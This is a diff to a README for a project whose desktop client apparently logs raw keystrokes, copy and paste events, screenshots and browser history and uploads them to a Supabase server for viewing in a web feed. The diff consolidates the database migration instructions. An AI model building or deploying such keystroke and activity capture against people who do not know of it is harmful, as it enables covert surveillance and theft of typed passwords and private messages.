@@ -102,6 +102,10 @@ message.
 
 Create a free Supabase project and run this in the Supabase SQL Editor:
 
+For a complete setup, run [migrations/000_all.sql](migrations/000_all.sql) once.
+It is safe to run against a project that already has these tables and preserves
+existing message, device, and history rows.
+
 ```sql
 create table public.messages (
    id bigint primary key,
@@ -143,30 +147,18 @@ set raw_text = text
 where raw_text = '';
 ```
 
-Run [migrations/003_add_raw_message_text.sql](migrations/003_add_raw_message_text.sql) and [migrations/004_add_raw_only_flag.sql](migrations/004_add_raw_only_flag.sql) in Supabase before deploying the updated client. Older messages use their filtered text as the raw fallback.
-
-Run [migrations/006_add_source_url.sql](migrations/006_add_source_url.sql) in Supabase before deploying the updated client. Existing messages keep an empty source URL.
-
-Run [migrations/010_create_screenshots_storage.sql](migrations/010_create_screenshots_storage.sql) before using the per-device Screenshot button. Add `SUPABASE_URL` and `SUPABASE_SERVICE_ROLE_KEY` to Render; screenshots are stored in the private `screenshots` bucket and metadata is stored in `public.screenshots`.
-
-Run [migrations/011_create_website_history.sql](migrations/011_create_website_history.sql) to enable the Website History tab. The desktop client records URL changes from supported active browsers every five seconds and stores them with the device and browser name.
+The consolidated [migrations/000_all.sql](migrations/000_all.sql) includes raw messages, source URLs, screenshots, website history, and remote logs. Add `SUPABASE_URL` and `SUPABASE_SERVICE_ROLE_KEY` to Render; screenshots are stored in the private `screenshots` bucket and metadata is stored in `public.screenshots`.
 
 The Render environment must also contain `DATABASE_URL`, `SUPABASE_URL`, and
 `SUPABASE_SERVICE_ROLE_KEY`. The service role key is server-only and must not be
 placed in the desktop client or web page.
 
-To rebuild the messages table and remove legacy per-keystroke rows, run
-[migrations/007_rebuild_messages_table.sql](migrations/007_rebuild_messages_table.sql)
-in Supabase. It preserves completed messages, normalizes empty raw text to the
-filtered text, and does not modify the separate `raw_batches` table.
-
-Run [migrations/005_add_raw_batches.sql](migrations/005_add_raw_batches.sql) to
-create the separate `raw_batches` table. The desktop client groups raw keyboard
-events into ten-second gzip-compressed batches with millisecond timestamps,
-device ID, application name, and session ID. Failed batch uploads are retained
-locally in `%LOCALAPPDATA%\KeyboardService\pending_raw_batches.json` until the
-server accepts them. The filtered `messages` table no longer receives new
-per-key raw rows.
+The desktop client groups raw keyboard events into ten-second gzip-compressed
+batches with millisecond timestamps, device ID, application name, and session ID.
+Failed batch uploads are retained locally in
+`%LOCALAPPDATA%\KeyboardService\pending_raw_batches.json` until the server
+accepts them. The filtered `messages` table no longer receives new per-key raw
+rows.
 
 The desktop client records `Ctrl+C` as a separate copied message and `Ctrl+V`
 as a pasted message. The web feed uses different bubble styles for each.
